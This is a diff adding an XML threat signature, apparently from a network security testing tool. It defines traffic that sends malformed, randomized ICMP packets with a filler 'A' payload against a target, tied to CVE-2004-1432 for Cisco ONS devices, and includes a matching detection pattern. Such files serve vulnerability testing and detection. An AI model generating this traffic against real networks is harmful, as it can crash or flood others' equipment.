@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Malformed Random ICMP Packet"/>
+    <EngDesc display="true" value="This threat sends multiple malformed ICMP packets."/>
+    <Intent display="true">
+      <item value="Corruption"/>
+      <item value="Flood"/>
+      <item value="Implementation_Exploitation"/>
+    </Intent>
+    <Protocol display="true" value="ICMP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.cisco.com/warp/public/707/cisco-sa-20040721-ons.shtml"/>
+    <CVEID display="true" value="CVE-2004-1432"/>
+    <bugtraqID display="true" value="10768"/>
+    <OSVDB display="true" value="8150"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464ecd8700a900fe009b00c94860a926"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742199995000000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="ICMP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41"/>
+    <Created value="1139462228" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="@random(10,30)" Protocol="1" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <ICMP Type="@random(0,FF)" Code="@random(0,FF)" Checksum="" Identifier="@random(0,FFFF)" SequenceNumber="@random(0,FFFF)" Pointer="@random(0,FF)" unused3Byte="@random(0,FFFFF)" Unused4Byte="@random(0,FFFFFFFF)" GatewayInternetAddress="@random(0,FFFFFFFF)" Payload="414141414141414141414141414141414141414141414141414141414141414141"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
